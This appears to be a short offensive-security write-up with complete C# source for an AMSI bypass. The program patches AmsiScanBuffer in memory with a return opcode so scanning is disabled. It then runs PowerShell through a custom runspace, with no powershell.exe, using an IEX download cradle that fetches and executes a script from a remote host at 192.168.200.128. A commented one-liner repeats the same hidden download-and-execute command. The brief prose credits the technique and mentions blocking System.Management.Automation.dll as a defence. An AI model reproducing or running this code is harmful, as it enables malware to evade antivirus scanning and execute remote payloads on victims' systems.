The AMSI Bypassing along with System.Management.Automation.Runspaces which doesn't requeire the powershell.exe to execute powershell commands.
The Powershell.exe is just interpret of .NET assembly System.Management.Automation.dll to execute OS Command and invoke PowerShell commands.
System.Management.Automation.dll file is loaded when powershell.exe open up. hence I do not rely on powershell.exe to execute OS command and Invoke powershell command, 
because We can write our own interpreter to execucate any OS Command without having powershell.exe. in conclusion if someone had asked me that how Do we prevent from powershell base attack.I woulnd have recommend blocking System.Management.Automation.dll like I mention above The Powershell.exe is just interpret of .NET assembly System.Management.Automation.dll to execute OS Command.


**This AMSI Patching Techniquie is heavy reliance on rastamouse Techniques**
```
using System;
using System.Runtime.InteropServices;
using System.Management.Automation.Runspaces;
using System.Management.Automation;
using System.Text;

namespace AmsiScan
{
    class Program
    {
        static void Main(string[] args)
        {
          
            var AmsiDLL = LoadLibrary("amsi.dll"); // Load the amsi.dll  to obtain The AmsiScanBuffer Address
            var asbAddress = GetProcAddress(AmsiDLL, "AmsiScanBuffer");

            var ret = new byte[] { 0xc3 }; //patch opcode
            VirtualProtect(asbAddress, (UIntPtr)ret.Length, 0x40, out uint oldProtect); //Pointer changing the AmsiScanBuffer memory protection
            Marshal.Copy(ret, 0, asbAddress, ret.Length);
            VirtualProtect(asbAddress, (UIntPtr)ret.Length, oldProtect, out uint _);
            Execution.MeMe();

        }
        //powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.200.128:80/Test'))"
        public class Execution
        {
            public static void MeMe()
            {
                RunspaceConfiguration rspacecfg = RunspaceConfiguration.Create();
                Runspace rspace = RunspaceFactory.CreateRunspace(rspacecfg);
                rspace.Open();
                Pipeline pipeline = rspace.CreatePipeline();
                pipeline.Commands.AddScript("iex ((New-Object Net.WebClient).DownloadString('http://192.168.200.128:80/Test'))");
                pipeline.Invoke();
            }
        }

        //Importing The Necessary WInAPI to Load the LoadLibrary other related to system function.

        [DllImport("kernel32.dll")]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    }
}

```
